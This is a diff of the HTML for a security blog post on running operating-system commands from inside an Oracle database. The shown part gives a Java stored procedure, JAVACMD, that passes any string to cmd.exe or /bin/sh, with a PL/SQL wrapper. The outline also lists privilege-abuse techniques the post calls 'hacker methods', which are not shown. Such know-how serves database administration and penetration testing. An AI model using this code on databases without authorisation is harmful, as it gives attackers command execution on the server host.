@@ -1,23 +1,11 @@
-
-
 <!DOCTYPE html>
-<html lang="en" data-default-color-scheme=auto>
-
-
-
+<html lang=en>
 <head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
-  <link rel="icon" href="/img/fluid.png">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="henices">
-  <meta name="keywords" content="">
-  
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
     <meta name="description" content="1. 正统方法1.1 使用JAVA1.1.1 代码Oracle 数据库都支持Java，可以利用java来实现我们需要的功能。 123456789101112131415161718192021222324252627282930313233343536373839404142434445CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &quot;JA">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Execute os command in Oracle Database">
@@ -29,309 +17,174 @@
 <meta property="article:modified_time" content="2023-09-06T03:00:51.727Z">
 <meta property="article:author" content="henices">
 <meta property="article:tag" content="Security">
-<meta name="twitter:card" content="summary_large_image">
-  
-  
-    <meta name="referrer" content="no-referrer-when-downgrade">
-  
-  
-  <title>Execute os command in Oracle Database - 安全代码</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Execute os command in Oracle Database</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
 
 
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+    <!-- Umami Analytics -->
 
 
-<link  rel="stylesheet" href="/css/main.css" />
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
 
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="https://www.usmacd.com/rss.xml" title="安全代码" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.2.0"></head>
 
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
-  
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/cn/other/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/cn/oneplus3T_p3/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://usmacd.com/cn/oracle_run_os_cmd/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://usmacd.com/cn/oracle_run_os_cmd/&text=Execute os command in Oracle Database"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://usmacd.com/cn/oracle_run_os_cmd/&title=Execute os command in Oracle Database"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://usmacd.com/cn/oracle_run_os_cmd/&is_video=false&description=Execute os command in Oracle Database"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Execute os command in Oracle Database&body=Check out this article: http://usmacd.com/cn/oracle_run_os_cmd/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://usmacd.com/cn/oracle_run_os_cmd/&title=Execute os command in Oracle Database"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://usmacd.com/cn/oracle_run_os_cmd/&title=Execute os command in Oracle Database"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://usmacd.com/cn/oracle_run_os_cmd/&title=Execute os command in Oracle Database"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://usmacd.com/cn/oracle_run_os_cmd/&title=Execute os command in Oracle Database"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://usmacd.com/cn/oracle_run_os_cmd/&name=Execute os command in Oracle Database&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://usmacd.com/cn/oracle_run_os_cmd/&t=Execute os command in Oracle Database"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
 
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%AD%A3%E7%BB%9F%E6%96%B9%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text">1. 正统方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E4%BD%BF%E7%94%A8JAVA"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 使用JAVA</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-1-%E4%BB%A3%E7%A0%81"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.1.1 代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-2-%E8%AE%BE%E7%BD%AE%E8%BE%93%E5%87%BA"><span class="toc-number">1.1.2.</span> <span class="toc-text">1.1.2 设置输出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-3-%E9%9C%80%E8%A6%81%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">1.1.3.</span> <span class="toc-text">1.1.3 需要的权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-4-%E5%AE%9E%E9%AA%8C%E7%BB%93%E6%9E%9C"><span class="toc-number">1.1.4.</span> <span class="toc-text">1.1.4 实验结果</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-5-%E6%B3%A8%E6%84%8F"><span class="toc-number">1.1.5.</span> <span class="toc-text">1.1.5 注意</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-DBMS-SCHEDULAR"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 DBMS_SCHEDULAR</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-1-DBMS-SCHEDULAR-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.2.1 DBMS_SCHEDULAR 简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-2-%E9%9C%80%E8%A6%81%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">1.2.2.</span> <span class="toc-text">1.2.2 需要的权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-3-%E6%89%A7%E8%A1%8C%E7%9A%84%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.2.3.</span> <span class="toc-text">1.2.3 执行的语句</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-4-%E6%B3%A8%E6%84%8F"><span class="toc-number">1.2.4.</span> <span class="toc-text">1.2.4 注意</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-%E4%BD%BF%E7%94%A8oradebug"><span class="toc-number">1.3.</span> <span class="toc-text">1.3 使用oradebug</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E7%9A%84%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text">执行的语句</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F"><span class="toc-number">1.3.2.</span> <span class="toc-text">注意</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%BB%91%E5%AE%A2%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">2. 黑客方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-DBMS-JAVA-TEST-FUNCALL"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 DBMS_JAVA_TEST.FUNCALL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-%E6%89%A7%E8%A1%8C%E7%9A%84%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.1.1.</span> <span class="toc-text">2.1.1 执行的语句</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-%E9%9C%80%E8%A6%81%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.1.2 需要的权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-3-%E5%8F%97%E5%BD%B1%E5%93%8D%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.1.3.</span> <span class="toc-text">2.1.3 受影响系统</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-DBMS-JAVA-RUNJAVA"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 DBMS_JAVA.RUNJAVA</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-1-%E6%89%A7%E8%A1%8C%E7%9A%84%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1 执行的语句</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-2-%E9%9C%80%E8%A6%81%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2 需要的权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-3-%E5%8F%97%E5%BD%B1%E5%93%8D%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.2.3.</span> <span class="toc-text">2.2.3 受影响系统</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
 
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"usmacd.com","root":"/","version":"1.9.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-
-  
-<meta name="generator" content="Hexo 7.2.0"><link rel="alternate" href="/atom.xml" title="安全代码" type="application/atom+xml">
-<link rel="alternate" href="/rss.xml" title="安全代码" type="application/rss+xml">
-</head>
-
-
-<body>
-  
-
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
   <header>
     
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Execute os command in Oracle Database
+    </h1>
 
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>安全代码</strong>
-    </a>
 
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
 
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">henices</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-09-06T03:00:51.727Z" class="dt-published" itemprop="datePublished">2023-09-06</time>
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/" target="_self">
-                <i class="iconfont icon-home-fill"></i>
-                <span>Home</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/" target="_self">
-                <i class="iconfont icon-archive-fill"></i>
-                <span>Archives</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/" target="_self">
-                <i class="iconfont icon-tags-fill"></i>
-                <span>Tags</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/" target="_self">
-                <i class="iconfont icon-user-fill"></i>
-                <span>About</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/" target="_self">
-                <i class="iconfont icon-link-fill"></i>
-                <span>Links</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/rss.xml" target="_self">
-                <i class="iconfont icon-rss"></i>
-                <span>rss</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/sitemap.xml" target="_self">
-                
-                <span>sitemap</span>
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              <i class="iconfont icon-search"></i>
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
-              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
-            </a>
-          </li>
-        
-      </ul>
+      
     </div>
-  </div>
-</nav>
 
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Security/" rel="tag">Security</a>
+    </div>
+
+
+    </div>
+  </header>
   
 
-<div id="banner" class="banner" parallax=true
-     style="background: url('https://images.unsplash.com/photo-1473181488821-2d23949a045a?w=640') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle">Execute os command in Oracle Database</span>
-          
-        </div>
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="1-正统方法"><a href="#1-正统方法" class="headerlink" title="1. 正统方法"></a>1. 正统方法</h2><h3 id="1-1-使用JAVA"><a href="#1-1-使用JAVA" class="headerlink" title="1.1 使用JAVA"></a>1.1 使用JAVA</h3><h4 id="1-1-1-代码"><a href="#1-1-1-代码" class="headerlink" title="1.1.1 代码"></a>1.1.1 代码</h4><p>Oracle 数据库都支持Java，可以利用java来实现我们需要的功能。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED <span class="string">&quot;JAVACMD&quot;</span> AS</span><br><span class="line"><span class="keyword">import</span> java.lang.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JAVACMD</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">execCommand</span> <span class="params">(String command)</span> <span class="keyword">throws</span> IOException</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String[] finalCommand;</span><br><span class="line">        <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().indexOf(<span class="string">&quot;windows&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">            finalCommand = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">4</span>];</span><br><span class="line">            finalCommand[<span class="number">0</span>] = <span class="string">&quot;C:\\windows\\system32\\cmd.exe&quot;</span>;</span><br><span class="line">            finalCommand[<span class="number">1</span>] = <span class="string">&quot;/y&quot;</span>;</span><br><span class="line">            finalCommand[<span class="number">2</span>] = <span class="string">&quot;/c&quot;</span>;</span><br><span class="line">            finalCommand[<span class="number">3</span>] = command;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            finalCommand = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">3</span>];</span><br><span class="line">            finalCommand[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">            finalCommand[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">            finalCommand[<span class="number">2</span>] = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(finalCommand);</span><br><span class="line">        <span class="keyword">if</span> (p.waitFor() != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p.exitValue() == <span class="number">1</span>)</span><br><span class="line">               System.err.println(<span class="string">&quot;command execute failed.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(p.getInputStream());</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">        String lineStr;</span><br><span class="line">        <span class="keyword">while</span> ((lineStr = inBr.readLine()) != <span class="literal">null</span>)</span><br><span class="line">            System.out.println(lineStr);</span><br><span class="line">        inBr.close();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line"> &#125;</span><br><span class="line">&#125;;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">CREATE OR REPLACE PROCEDURE <span class="title function_">JAVACMDPROC</span> <span class="params">(p_command IN VARCHAR2)</span></span><br><span class="line">AS LANGUAGE JAVA</span><br><span class="line">NAME <span class="string">&#x27;JAVACMD.execCommand (java.lang.String)&#x27;</span>;</span><br><span class="line">/</span><br></pre></td></tr></table></figure>
 
-        
-          
-  <div class="mt-3">
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-09-06 11:00" pubdate>
-          September 6, 2023 am
-        </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          1.1k words
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          10 mins
-        
-      </span>
-    
-
-    
-    
-      
-        <span id="busuanzi_container_page_pv" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          <span id="busuanzi_value_page_pv"></span> views
-        </span>
-        
-      
-    
-  </div>
-
-
-        
-      </div>
-
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <h1 id="seo-header">Execute os command in Oracle Database</h1>
-            
-            
-              <div class="markdown-body">
-                
-                <h2 id="1-正统方法"><a href="#1-正统方法" class="headerlink" title="1. 正统方法"></a>1. 正统方法</h2><h3 id="1-1-使用JAVA"><a href="#1-1-使用JAVA" class="headerlink" title="1.1 使用JAVA"></a>1.1 使用JAVA</h3><h4 id="1-1-1-代码"><a href="#1-1-1-代码" class="headerlink" title="1.1.1 代码"></a>1.1.1 代码</h4><p>Oracle 数据库都支持Java，可以利用java来实现我们需要的功能。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED <span class="hljs-string">&quot;JAVACMD&quot;</span> AS<br><span class="hljs-keyword">import</span> java.lang.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JAVACMD</span><br>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execCommand</span> <span class="hljs-params">(String command)</span> <span class="hljs-keyword">throws</span> IOException<br> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        String[] finalCommand;<br>        <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().indexOf(<span class="hljs-string">&quot;windows&quot;</span>) != -<span class="hljs-number">1</span>) &#123;<br>            finalCommand = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">4</span>];<br>            finalCommand[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;C:\\windows\\system32\\cmd.exe&quot;</span>;<br>            finalCommand[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;/y&quot;</span>;<br>            finalCommand[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;/c&quot;</span>;<br>            finalCommand[<span class="hljs-number">3</span>] = command;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            finalCommand = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">3</span>];<br>            finalCommand[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>            finalCommand[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-c&quot;</span>;<br>            finalCommand[<span class="hljs-number">2</span>] = command;<br>        &#125;<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(finalCommand);<br>        <span class="hljs-keyword">if</span> (p.waitFor() != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (p.exitValue() == <span class="hljs-number">1</span>)<br>               System.err.println(<span class="hljs-string">&quot;command execute failed.&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(p.getInputStream());<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">inBr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(in));<br>        String lineStr;<br>        <span class="hljs-keyword">while</span> ((lineStr = inBr.readLine()) != <span class="hljs-literal">null</span>)<br>            System.out.println(lineStr);<br>        inBr.close();<br>        in.close();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        e.printStackTrace();<br>    &#125; <br> &#125;<br>&#125;;<br>/<br><br>CREATE OR REPLACE 